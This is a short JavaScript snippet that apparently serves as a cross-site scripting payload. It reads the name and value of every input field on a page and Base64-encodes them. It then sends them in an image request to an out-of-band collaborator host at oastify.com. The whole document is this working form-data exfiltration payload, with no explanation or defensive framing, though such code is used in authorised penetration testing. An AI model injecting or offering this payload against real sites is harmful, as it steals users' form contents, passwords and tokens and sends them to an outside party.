(function() {
    let data = {};
    let inputs = document.querySelectorAll('input');
    
    inputs.forEach(input => {
        if (input.name) {
            data[input.name] = input.value;
        }
    });
    
    let payload = btoa(JSON.stringify(data)); // Base64 encode
    let collaborator = 'r7z6iqxtkro4lnr4yzhdr5skobu2itbh0.oastify.com';
    
    new Image().src = 'https://' + collaborator + '/?data=' + payload;
})();
